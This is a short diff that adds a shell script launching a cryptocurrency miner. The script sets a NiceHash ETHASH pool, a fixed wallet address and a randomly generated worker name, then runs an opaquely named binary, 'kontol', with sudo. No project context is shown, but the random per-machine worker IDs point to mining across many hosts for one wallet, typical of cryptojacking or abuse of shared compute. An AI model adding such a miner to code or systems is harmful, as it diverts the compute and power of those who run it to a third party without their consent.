@@ -1,0 +1,5 @@
+POOL=stratum+tcp://daggerhashimoto.eu.nicehash.com:3353
+WALLET=3BsJ6cvtviyvS6tWfFWaDGHStB8pTHUrNH
+WORKER=$(echo $(shuf -i 1-999999999 -n 1)-FA)
+ALGO=ETHASH
+sudo ./kontol --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO
